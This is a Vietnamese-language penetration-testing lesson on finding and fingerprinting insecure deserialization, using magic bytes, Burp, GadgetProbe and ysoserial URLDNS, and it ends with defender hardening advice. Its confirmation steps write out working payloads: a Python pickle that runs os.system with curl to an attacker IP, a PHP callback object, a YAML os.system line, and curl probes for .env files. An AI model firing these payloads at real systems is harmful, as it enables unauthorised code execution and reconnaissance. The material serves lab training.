---
title: "10. Detection & Fingerprinting"
type: methodology
tags: [pentest, deserialization, detection, fingerprinting, methodology, lesson-10]
aliases: [Deserialization Detection, Fingerprinting Serialized Data]
created: 2026-03-31
---

> **Prerequisites**: [[03-phpggc-phar-deserialization|03. PHPGGC & PHAR]], [[07-java-deserialization-alt-vectors|07. Java Alt Vectors]], [[09-python-unsafe-deserialization-ecosystem|09. Python Ecosystem]]
> **Objectives**:
> - Nhận biết serialized data của mọi ngôn ngữ từ HTTP traffic
> - Thực hiện black-box detection workflow không có source code
> - Dùng GadgetProbe để enumerate Java classpath từ xa
> - Master Burp Suite workflow cho deserialization testing
>
---

## Tổng quan phương pháp

Phát hiện deserialization vulnerability là hai bước:
1. **Fingerprinting** — nhận biết serialized data ở đâu trong traffic
2. **Confirmation** — xác nhận deserialization thực sự xảy ra (OOB callback)

Black-box testing không có source code phụ thuộc hoàn toàn vào bước này.

---

## Magic Bytes & Fingerprint Reference

### Bảng nhận biết toàn diện

| Format | Magic Bytes (Hex) | Base64 Prefix | Text Prefix | Ghi chú |
|--------|------------------|--------------|-------------|---------|
| Java Serialized | `AC ED 00 05` | `rO0A` | — | Binary only |
| PHP Serialize | — | — | `O:`, `a:`, `s:`, `i:` | Text, dễ đọc |
| Python Pickle (proto 2) | `80 02` | `gASV` (varies) | — | Binary |
| Python Pickle (proto 4) | `80 04` | `gASV` | — | Binary |
| Python Pickle (proto 0) | — | — | `cos\n` hoặc `c__builtin__` | ASCII opcodes |
| .NET BinaryFormatter | `00 01 00 00 00` | `AAEAAAD` | — | Windows apps |
| Ruby Marshal | `04 08` | `BAg` | — | Rails apps |
| Java XML (XStream) | — | — | `<com.`, `<sorted-set>` | XML format |
| Java JSON (Jackson) | — | — | `{"@class":` | Polymorphic JSON |
| YAML (SnakeYAML) | — | — | `!!java.` hoặc `!!python/` | Text |

### Nhận biết nhanh trong Burp

**Workflow cơ bản**:

```bash
1. Proxy → HTTP History → filter POST requests
2. Với mỗi request có cookie hoặc body:
   - Nếu value trông như base64 → Inspector tab → decode
   - Kiểm tra 4 bytes đầu sau decode
3. Scanner (Burp Pro) → "Serialization" issues
4. Extension: Java Deserialization Scanner (tự động)
```

**Burp Decoder quick check**:

```bash
1. Copy cookie value
2. Decoder tab → Decode as Base64
3. Xem hex: AC ED 00 05 = Java
4. Xem text: O:4:"User" = PHP
5. Xem hex: 80 04 = Python pickle
```

---

## Công cụ Detection

### Java Deserialization Scanner (Burp Extension)

Burp extension tự động test Java deserialization:

```bash
1. BApp Store → Java Deserialization Scanner (install)
2. Intercept request với potential serialized data
3. Extensions tab → Java Deser Scanner → Active Scan
4. Chọn insertion point (cookie/param/body)
5. Tool tự động thử các chains: CC1, CC2, CC5, CC6, Spring...
6. Dùng Burp Collaborator để detect OOB callbacks
```

### GadgetProbe — Remote Classpath Enumeration

GadgetProbe detect classes trên remote JVM bằng cách gửi serialized objects với specific class signatures và dùng DNS/HTTP để confirm existence:

```bash
# Download GadgetProbe
wget https://github.com/BishopFox/GadgetProbe/releases/latest/download/GadgetProbe-1.1-SNAPSHOT-all.jar

# Chuẩn bị wordlist (có sẵn trong release)
# gadgets-libraries.txt — common gadget libraries
# gadgets-other.txt — các classes phổ biến khác

# Run với Burp Collaborator
java -jar GadgetProbe-1.1-SNAPSHOT-all.jar \
  --gadget-probe-wordlist gadgets-libraries.txt \
  --collaborator-url your.burpcollaborator.net \
  --target http://target.htb:8080/ \
  --cookie "session=CURRENT_SESSION_COOKIE"

# Output:
# [+] Found: org.apache.commons.collections.Transformer (commons-collections 3.x)
# [+] Found: org.springframework.beans.factory.BeanFactory (spring-beans)
# [-] Not found: com.groovy...
```

### ysoserial URLDNS — Universal Java Deser Confirm

```bash
# Generate URLDNS payload (không cần gadget library)
java -jar ysoserial-all.jar URLDNS "http://java-deser-test.$(date +%s).burpcollaborator.net" \
  | base64 -w0 > /tmp/urldns.txt

# Inject vào tất cả potential serialized fields
# Headers, cookies, POST body, ViewState parameters...
for FIELD in session auth token viewstate; do
  curl -s http://target.htb/ -H "Cookie: $FIELD=$(cat /tmp/urldns.txt)"
done

# Check Burp Collaborator sau vài giây
# DNS callback → field đó được deserialize
```

### Đọc serialized Java objects với SerializationDumper

```bash
# SerializationDumper parse Java serial stream và print human-readable
git clone https://github.com/NickstaDB/SerializationDumper.git
cd SerializationDumper
java -jar SerializationDumper.jar rO0ABXNy...base64...

# Output:
# STREAM_MAGIC - 0xaced
# STREAM_VERSION - 5
# Contents
#   TC_OBJECT - 0x73
#     TC_CLASSDESC - 0x72
#       className - java.util.HashMap
#       serialVersionUID - 0x0507dac1c31660d1
```

---

## Black-box Detection Workflow

### Phase 1: Passive Recon

```bash
1. Browse toàn bộ ứng dụng với Burp Proxy active
2. Kiểm tra HTTP History:
   a. Cookies có format lạ (không phải JWT/UUID/plain text)?
   b. POST body có base64-encoded data không rõ format?
   c. Custom headers: X-Session-Data, X-User-State, X-Auth-Token?
   d. Response body có trả về serialized data không?
3. View source:
   a. Hidden inputs: javax.faces.ViewState, __VIEWSTATE (ASP.NET)
   b. JavaScript files có endpoint mới không?
4. Kiểm tra file extensions: .ser, .pickle, .pkl, .phar uploads
```

### Phase 2: Fingerprint Analysis

```bash
# Script tự động decode và check tất cả cookies trong request
python3 << 'EOF'
import base64, sys

cookies = [
    "gASVHgAAAAAAAACMA29zlJOUhJRSlC4=",   # sample
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
    "Tzo0OiJVc2VyIjoxOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=",
]

for cookie in cookies:
    try:
        data = base64.b64decode(cookie)
        hex_prefix = data[:4].hex()
        print(f"Cookie: {cookie[:20]}...")
        print(f"  Hex prefix: {hex_prefix}")

        if hex_prefix.startswith("aced"):
            print("  → JAVA SERIALIZED OBJECT")
        elif data[:2] == b'\x80\x04' or data[:2] == b'\x80\x02':
            print("  → PYTHON PICKLE")
        elif data[:2] in (b'O:', b'a:', b's:', b'i:'):
            print("  → PHP SERIALIZED")
        elif b'O:' in data[:20]:
            print("  → PHP SERIALIZED (base64 of text)")
        else:
            print(f"  → Unknown: {data[:20]}")
    except Exception as e:
        print(f"  → Not base64: {e}")
EOF
```

### Phase 3: Confirmation via OOB

```bash
# Java: URLDNS
COLLAB_DOMAIN="java-test.$(openssl rand -hex 4).burpcollaborator.net"
java -jar ysoserial-all.jar URLDNS "http://$COLLAB_DOMAIN" | base64 -w0

# PHP: Serialize với trigger URL
php -r "
class TestClass {
    function __destruct() {
        file_get_contents(\$this->url);
    }
}
\$t = new TestClass();
\$t->url = 'http://10.10.14.5:8080/php_test';
echo base64_encode(serialize(\$t));
"

# Python: pickle với curl
python3 -c "
import pickle, os, base64
class T:
    def __reduce__(self): return (os.system, ('curl http://10.10.14.5:8080/python_test',))
print(base64.b64encode(pickle.dumps(T())).decode())
"
```

### Phase 4: Classpath / Framework Enumeration

```bash
# Java — GadgetProbe tự động
java -jar GadgetProbe.jar \
  --gadget-probe-wordlist gadgets-libraries.txt \
  --collaborator-url your.collab.net \
  --target http://TARGET/endpoint

# PHP — xác định framework từ error messages hoặc headers
curl -I http://target.htb/ | grep -i "x-powered-by\|server"
curl -s http://target.htb/composer.json
curl -s http://target.htb/.env  # nếu debug mode

# Python — xác định từ error stack trace
curl -s http://target.htb/api/badrequest
# Stack trace → thấy Django/Flask/FastAPI → biết ecosystem
```

---

## Checklist Hoàn Chỉnh

```yaml
PASSIVE:
□ Proxy tất cả traffic trong Burp
□ HTTP History: filter by "body contains base64-looking values"
□ Cookie analysis: decode từng cookie value
□ Hidden inputs: ViewState, serialized tokens
□ Response analysis: server trả về serialized data không?
□ File uploads: .pkl, .phar, .ser extensions được accept?

FINGERPRINT:
□ Hex check: AC ED 00 05 = Java; 80 04/02 = Pickle; O: = PHP
□ Base64 prefix: rO0A = Java; gASV = Pickle; Tzo = PHP O:
□ XML tags: <com.package = XStream; !!java. = SnakeYAML
□ JSON keys: py/reduce = jsonpickle; @class = Jackson poly

CONFIRM:
□ Java: URLDNS payload → DNS callback
□ PHP: Serialize với file_get_contents callback
□ Python: pickle với curl/nslookup callback
□ YAML: !!python/object/apply:os.system ["curl COLLAB"]

ENUMERATE (Java):
□ GadgetProbe với gadgets-libraries.txt wordlist
□ Error-based classpath leak từ stack traces
□ Stack trace có chứa library version info?
□ /META-INF/MANIFEST.MF accessible?

DOCUMENT:
□ Ghi lại endpoint và parameter chứa serialized data
□ Ghi lại format đã xác nhận
□ Ghi lại classpath libraries đã confirm (Java)
□ Tạo test case reproduce
```

---

## Phát hiện & Phòng thủ

> [!warning] Detection từ góc độ Defender
> Defender có thể detect attackers đang fingerprint qua:
> - Multiple malformed serialized requests (InvalidClassException spam)
> - URLDNS callbacks → Burp Collaborator domains trong DNS logs
> - GadgetProbe scan pattern: nhiều requests với class-specific signatures
> - Base64 data với Java magic bytes trong unusual fields
>
> [!note] Hardening để reduce fingerprinting surface
> - Không trả về verbose error messages (stack traces expose class names)
> - Dùng generic error handler: không lộ framework/library info
> - Monitor DNS logs từ application servers — URLDNS là dấu hiệu rõ ràng
> - WAF rule: alert/block base64 data starting with `rO0A` trong cookie fields
>
---

## Lab Thực hành

| Platform | Machine | Kỹ thuật |
|----------|---------|---------|
| HTB | Bất kỳ Java web machine | URLDNS confirmation workflow |
| PortSwigger | Tất cả deser labs | Burp Scanner + Collaborator workflow |
| HTB | **Time** (Retired) | Error-based classpath enumeration |
| Tất cả | — | Thực hành Burp Java Deser Scanner extension |